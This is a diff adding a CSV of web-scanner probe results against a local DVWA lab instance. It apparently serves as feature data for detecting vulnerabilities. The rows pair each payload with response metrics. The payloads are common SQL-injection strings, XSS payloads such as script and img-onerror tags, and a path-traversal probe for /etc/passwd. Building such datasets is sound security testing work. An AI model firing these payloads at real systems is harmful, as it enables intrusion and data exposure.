@@ -1,0 +1,13 @@
+page_url,request_url,form_method,payload_type,payload,resp_length_base,status_code_base,resp_time_base,has_sql_error_base,has_script_tag_base,resp_length_probe,status_code_probe,resp_time_probe,has_sql_error_probe,has_script_tag_probe,len_diff,status_changed,resp_time_diff,has_text_diff,probe_reflected,label
+http://127.0.0.1/dvwa/security.php,http://127.0.0.1/dvwa/security.php,POST,sqli,test' OR '1'='1,4582,200,2.9907097816467285,1,1,4590,200,0.0370943546295166,1,1,8,0,-2.953615427017212,1,0,
+http://127.0.0.1/dvwa/security.php,http://127.0.0.1/dvwa/security.php,POST,sqli,' OR 1=1 -- ,4582,200,2.9907097816467285,1,1,4590,200,0.0034835338592529297,1,1,8,0,-2.9872262477874756,1,0,
+http://127.0.0.1/dvwa/security.php,http://127.0.0.1/dvwa/security.php,POST,sqli,""" OR """"=""""",4582,200,2.9907097816467285,1,1,4590,200,0.014258623123168945,1,1,8,0,-2.9764511585235596,1,0,
+http://127.0.0.1/dvwa/security.php,http://127.0.0.1/dvwa/security.php,POST,xss,<script>alert(1)</script>,4582,200,2.9907097816467285,1,1,4590,200,0.013430356979370117,1,1,8,0,-2.9772794246673584,1,0,
+http://127.0.0.1/dvwa/security.php,http://127.0.0.1/dvwa/security.php,POST,xss,<img src=1 onerror=alert(1)>,4582,200,2.9907097816467285,1,1,4590,200,0.01251363754272461,1,1,8,0,-2.978196144104004,1,0,
+http://127.0.0.1/dvwa/security.php,http://127.0.0.1/dvwa/security.php,POST,lfi,../../../../etc/passwd,4582,200,2.9907097816467285,1,1,4590,200,0.002243518829345703,1,1,8,0,-2.988466262817383,1,0,
+http://127.0.0.1/dvwa/logout.php,http://127.0.0.1/dvwa/login.php,POST,sqli,test' OR '1'='1,1434,200,0.003719329833984375,0,0,1434,200,0.0029587745666503906,0,0,0,0,-0.0007605552673339844,1,0,
+http://127.0.0.1/dvwa/logout.php,http://127.0.0.1/dvwa/login.php,POST,sqli,' OR 1=1 -- ,1434,200,0.003719329833984375,0,0,1434,200,0.003022909164428711,0,0,0,0,-0.0006964206695556641,1,0,
+http://127.0.0.1/dvwa/logout.php,http://127.0.0.1/dvwa/login.php,POST,sqli,""" OR """"=""""",1434,200,0.003719329833984375,0,0,1434,200,0.022643566131591797,0,0,0,0,0.018924236297607422,1,0,
+http://127.0.0.1/dvwa/logout.php,http://127.0.0.1/dvwa/login.php,POST,xss,<script>alert(1)</script>,1434,200,0.003719329833984375,0,0,1434,200,0.015368461608886719,0,0,0,0,0.011649131774902344,1,0,
+http://127.0.0.1/dvwa/logout.php,http://127.0.0.1/dvwa/login.php,POST,xss,<img src=1 onerror=alert(1)>,1434,200,0.003719329833984375,0,0,1434,200,0.004183769226074219,0,0,0,0,0.00046443939208984375,1,0,
+http://127.0.0.1/dvwa/logout.php,http://127.0.0.1/dvwa/login.php,POST,lfi,../../../../etc/passwd,1434,200,0.003719329833984375,0,0,1434,200,0.003354310989379883,0,0,0,0,-0.0003650188446044922,1,0,
